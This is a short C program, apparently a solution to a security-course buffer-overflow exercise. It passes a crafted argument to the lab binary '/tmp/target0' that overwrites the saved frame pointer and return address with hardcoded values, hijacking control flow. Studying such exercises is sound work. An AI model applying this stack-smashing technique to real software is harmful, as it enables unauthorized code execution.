#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];

  int i;
  char crack_str[34];

  for(i = 0; i < 25; i++) crack_str[i] = 'A';
  strcpy(&crack_str[25], "\x40\xf8\xff\xbf"); //overwrite ebp
  strcpy(&crack_str[29], "\x1d\x85\x04\x08"); //overwrite eip

  args[0] = TARGET; 
  args[1] = crack_str;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}